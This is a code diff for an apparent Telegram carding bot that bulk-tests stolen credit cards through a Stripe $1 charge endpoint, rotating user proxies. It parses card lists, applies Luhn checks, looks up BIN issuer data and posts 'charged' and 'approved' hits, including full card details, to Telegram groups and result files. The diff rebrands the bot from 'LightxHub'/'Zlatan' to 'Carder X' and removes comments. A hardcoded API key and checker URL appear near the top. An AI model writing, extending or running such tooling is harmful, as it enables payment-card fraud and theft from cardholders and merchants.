@@ -48,7 +48,6 @@ from sub import get_premium_status
 STRIPE_API_URL = "https://stripeapi-production-76a7.up.railway.app/stripe/check"
 STRIPE_API_KEY = "darkanon"
 
-# ── Shared HTTP session for MST API calls (avoids per-card session creation) ──
 _MST_HTTP_SESSION = None
 
 def _get_mst_http_session():
@@ -71,12 +70,6 @@ def format_api_proxy(proxy: str) -> str:
     return proxy
 
 async def process_card_api(cc: str, mes: str, ano: str, cvv: str, proxy: str) -> Tuple[str, str]:
-    """
-    Process card using Atoti FFC Stripe $1 Charge with Corrigan fallback.
-
-    Returns:
-        Tuple of (status, message)
-    """
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
     cc_encoded = cc_formatted.replace("|", "%7C")
     proxy_encoded = urllib.parse.quote(proxy) if proxy else ""
@@ -122,8 +115,8 @@ from mass_gates.msh import ProxyManager, get_user_proxies
 # CONFIGURATION & URLS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-HIT_LOG_GROUP_ID = -1004479507133       # @lightXhub1 (Chats & Logs)
-EXTRA_CHARGED_GROUP_ID = -1004437051761 # LightxHub Admins (All Charged Hits Full Card)
+HIT_LOG_GROUP_ID = -1004479507133       # Carder X (Chats & Logs)
+EXTRA_CHARGED_GROUP_ID = -1004437051761 # Carder X Admins (All Charged Hits Full Card)
 BUTTON_LOCK_SECONDS = 30
 
 CUSTOM_CHARGED_EMOJI_ID = "5042050649248760772"
@@ -139,7 +132,6 @@ BTN_ALL_EMOJI_ID = "5447602197439218445"
 MST_SESSIONS = {}
 MST_SESSION_LOCKS = {}
 
-# ── Session GC: prune stale sessions every 10 min to prevent memory leaks ─────
 import threading as _mst_threading
 import time as _mst_time
 
@@ -175,20 +167,12 @@ REACTIONS = [
     "tickle", "tired", "wave", "wink", "yay", "yes"
 ]
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK DATA
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 class MstResultCallback(CallbackData, prefix="mstr"):
     session_id: str
     result_type: str
 
 class MstStopCallback(CallbackData, prefix="msts"):
     session_id: str
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CARD EXTRACTION FUNCTIONS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
     card_string = card_string.strip()
@@ -254,10 +238,6 @@ def extract_cards_from_text(text: str) -> List[str]:
                     cards.append(card_string)
     return cards
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HELPERS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 def log_hit_to_mst(user_id, username, first_name):
     try:
         with open("mst.txt", "a", encoding="utf-8") as f:
@@ -322,7 +302,7 @@ async def get_user_plan_name(user_id):
                 conn.close()
                 if row:
                     p = row['plan'].lower()
-                    if any(k in p for k in ["kashim", "chirag", "darkanon"]): return "Superuser <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
+                    if any(k in p for k in ["kashim", "chirag", "darkanon", "carderx"]): return "Carder X <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                     if "root" in p: return "𝗥𝗼𝗼𝘁 <tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji>"
                     if "elite" in p: return "𝗘𝗹𝗶𝘁𝗲 <tg-emoji emoji-id='5278751923338490157'>⭐</tg-emoji>"
                     if "core" in p: return "𝗖𝗼𝗿𝗲 <tg-emoji emoji-id='5042274086332400375'>🛠️</tg-emoji>"
@@ -349,10 +329,6 @@ def luhn_check(card_number: str) -> bool:
                 digit -= 9
         total += digit
     return total % 10 == 0
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# HIT NOTIFICATION FUNCTIONS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, user_obj, plan_name, hit_type):
     response_msg = html.escape(response_msg)
@@ -390,10 +366,6 @@ async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, user_obj, 
         logging.error(f"Error sending hit log: {e}")
 
 async def send_user_hit_notification(bot: Bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, hit_type, send_to_extra: bool = True):
-    """
-    Always sends the hit notification to the user's DM (private chat).
-    Broadcast to EXTRA_CHARGED_GROUP_ID only if send_to_extra is True.
-    """
     try:
         try:
             bin_data = await get_bin_info(cc_num[:6])
@@ -409,7 +381,7 @@ async def send_user_hit_notification(bot: Bot, session, cc_formatted, cc_num, re
 
         gif_url = await get_anime_gif()
         user_link = build_user_link(user_obj)
-        dev_link = '<a href="https://t.me/Salluuxx">ZLATAN</a>'
+        dev_link = '<a href="https://t.me/Lanxo2">CARDER X</a>'
         user_display = f"{user_link} ({plan_name})"
 
         if hit_type == "CHARGED":
@@ -430,10 +402,9 @@ async def send_user_hit_notification(bot: Bot, session, cc_formatted, cc_num, re
         )
 
         reply_markup = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="LightxHub", url="https://t.me/lightxHub_bot", style="primary")]
+            [InlineKeyboardButton(text="Carder X", url="https://t.me/zlatanchecker_bot", style="primary")]
         ])
 
-        # Always send card details to the user's DM only
         try:
             await safe_send_animation(bot, 
                 chat_id=user_obj.id,
@@ -460,7 +431,6 @@ async def send_user_hit_notification(bot: Bot, session, cc_formatted, cc_num, re
         if not send_to_extra:
             return
 
-        # Both CHARGED and APPROVED cards are broadcast to the extra group log
         try:
             await safe_send_animation(bot, 
                 chat_id=EXTRA_CHARGED_GROUP_ID,
@@ -484,10 +454,6 @@ async def send_user_hit_notification(bot: Bot, session, cc_formatted, cc_num, re
 
     except Exception as e:
         logging.error(f"Error sending user HIT message: {e}")
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESULT FILE GENERATION
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
     cards_list = []
@@ -519,14 +485,14 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
 
     lines = []
     lines.append("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
-    lines.append("┃         ZLATAN               ┃")
-    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Salluuxx")
+    lines.append("┃        CARDER X              ┃")
+    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Lanxo2")
     lines.append("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
     lines.append("")
     lines.append(f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {type_label} {type_emoji}")
     lines.append(f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ {total_count}")
     lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝘁𝗿𝗶𝗽𝗲 𝟭 𝗨𝗦𝗗")
-    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Zlatan")
+    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Carder X")
     lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
     lines.append("")
 
@@ -561,7 +527,7 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
             lines.append(f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bank}")
             lines.append(f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {country_display}")
             lines.append(f"👤 𝗨𝘀𝗲𝗿 ➛ {user_display}")
-            lines.append(f"🐈‍⬛ 𝗗𝗲𝘃 ➛ Zlatan")
+            lines.append(f"🐈‍⬛ 𝗗𝗲𝘃 ➛ Carder X")
             lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
             lines.append("")
 
@@ -572,13 +538,9 @@ def generate_result_file(session: dict, result_type: str, user_obj, plan_name: s
 
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
-    filename = f"LIGHTXHUB_STRIPE_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
+    filename = f"CARDERX_STRIPE_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
 
     return file_buffer, filename, total_count
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# BUTTONS & PROGRESS MESSAGE
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboardMarkup:
     session = MST_SESSIONS.get(session_id, {})
@@ -586,12 +548,10 @@ def get_result_buttons(session_id: str, is_running: bool = True) -> InlineKeyboa
     dead_count = session.get('dead', 0)
     charged_count = session.get('charged', 0)
     
-    # Handle both list length and int types
     if isinstance(approved_count, list): approved_count = len(approved_count)
     if isinstance(dead_count, list): dead_count = len(dead_count)
     if isinstance(charged_count, list): charged_count = len(charged_count)
     
-    # For MST/MSTR all count logic
     if "mst" in ("mst", "mstr"):
         error_count = session.get('errors', 0)
         if isinstance(error_count, list): error_count = len(error_count)
@@ -675,7 +635,7 @@ async def update_progress_message(bot: Bot, session_id):
         f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>{session['dead']}</b>\n"
         f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{session['errors']}</b>\n"
         f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>\n"
-        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/darkanonp'>DARKANON</a>\n"
+        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/Lanxo2'>Carder X</a>\n"
         f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
     )
 
@@ -707,10 +667,6 @@ async def update_progress_message(bot: Bot, session_id):
                 logging.error(f"Error updating progress: {e}")
         except Exception as e:
             logging.error(f"Error updating progress: {e}")
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACK HANDLERS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 @router.callback_query(MstResultCallback.filter())
 async def handle_result_callback(callback: types.CallbackQuery, callback_data: MstResultCallback):
@@ -828,10 +784,6 @@ async def handle_stop_callback(callback: types.CallbackQuery, callback_data: Mst
         except:
             pass
 
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CARD PROCESSING
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
     session = MST_SESSIONS.get(session_id)
     if not session or is_session_stopped(session_id):
@@ -845,7 +797,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             await update_progress_message(bot, session_id)
         return
 
-    # Extract card details for process_card_api
     cc_parts = cc_formatted.split('|')
     if len(cc_parts) != 4:
         session['errors'] += 1
@@ -960,14 +911,12 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
             asyncio.to_thread(update_user_stats, user_id, True),
         )
 
-        # Broadcast to logs and admins only if insufficient funds
         if "insufficient" in str(response_msg).lower():
             await asyncio.gather(
                 send_hit_log_to_group(bot, cc_formatted, response_msg, user_obj, plan_name, "APPROVED"),
                 send_user_hit_notification(bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, "APPROVED", send_to_extra=True),
             )
         else:
-            # Other approved cards (e.g. CVC error) only DM the user, not group/admins
             await send_user_hit_notification(bot, session, cc_formatted, cc_num, response_msg, user_obj, plan_name, "APPROVED", send_to_extra=False)
 
     elif "declined" in result_status:
@@ -982,10 +931,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         return
     if session['checked'] % 3 == 0 or session['checked'] == session['total']:
         await update_progress_message(bot, session_id)
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# MAIN COMMAND
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 @router.message(lambda message: (message.text and any(message.text.startswith(c) for c in ["/mst", "/mffc"])) or (message.caption and any(message.caption.startswith(c) for c in ["/mst", "/mffc"])))
 async def mst_command(message: types.Message):
@@ -1090,7 +1035,6 @@ async def mst_command(message: types.Message):
         await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid Luhn checked cards found.")
         return
 
-    # Detect if the command was sent from a group or supergroup
     is_group = message.chat.type in ("group", "supergroup", "channel")
 
     session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
@@ -1105,7 +1049,7 @@ async def mst_command(message: types.Message):
         f"<b><tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> 𝗗𝗲𝗮𝗱 ➛</b> <b>0</b>\n"
         f"<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>0</b>\n"
         f"<b><tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <b>0s</b>\n"
-        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/darkanonp'>DARKANON</a>\n"
+        f"<b><tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> 𝗗𝗲𝘃 ➛</b> <a href='https://t.me/Lanxo2'>Carder X</a>\n"
         f"<b><tg-emoji emoji-id='5406683434124859552'>🆔</tg-emoji> 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>"
     )
 
@@ -1136,7 +1080,7 @@ async def mst_command(message: types.Message):
         "error_cards": [],
         "user_obj": user,
         "plan_name": plan_name,
-        "is_group": is_group,  # Track whether started from a group
+        "is_group": is_group,
     }
 
     print(f"🚀 [MST] Started - {total_cards} cards - User: {user_id} - Group: {is_group}")
